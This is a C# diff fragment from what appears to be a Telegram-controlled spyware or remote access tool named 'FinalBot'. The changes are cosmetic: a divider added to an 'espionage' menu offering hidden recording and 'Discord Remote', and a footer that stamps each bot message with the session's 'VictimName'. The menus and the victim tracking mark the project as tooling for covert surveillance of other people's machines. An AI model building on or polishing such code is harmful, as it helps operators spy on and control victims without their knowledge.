 
-            await EditOrSend(chatId, messageId, "👁️ <b>ШПИОНАЖ</b>\nСкрытая запись и Discord Remote:", markup);
+            await EditOrSend(chatId, messageId, "👁️ <b>ШПИОНАЖ</b>\n━━━━━━━━━━━━━━━━━━\nСкрытая запись и Discord Remote:", markup);
         }
 
         private async Task ShowHelp(long chatId)
@@ -858,10 +1005,19 @@ namespace FinalBot
             await _botClient.SendTextMessageAsync(chatId, help, parseMode: ParseMode.Html);
         }
 
+        private string GetRichText(string text)
+        {
+            if (string.IsNullOrEmpty(text)) return "";
+            string footer = $"\n\n━━━━━━━━━━━━━━━━━━\n👤 <b>Session:</b> <code>{ConfigManager.VictimName}</code>";
+            if (text.Contains(footer)) return text;
+            return text + footer;
+        }
+
         private async Task EditOrSend(long chatId, int messageId, string text, InlineKeyboardMarkup markup, ParseMode parseMode = ParseMode.Html)
         {
-            try { await _botClient.EditMessageTextAsync(chatId, messageId, text, parseMode: parseMode, replyMarkup: markup); }
-            catch { await _botClient.SendTextMessageAsync(chatId, text, parseMode: parseMode, replyMarkup: markup); }
+            string richText = GetRichText(text);
+            try { await _botClient.EditMessageTextAsync(chatId, messageId, richText, parseMode: parseMode, replyMarkup: markup); }
+            catch { await _botClient.SendTextMessageAsync(chatId, richText, parseMode: parseMode, replyMarkup: markup); }
         }
 
         private async Task SendWithRetry(Func<Task<TgMessage>> action)
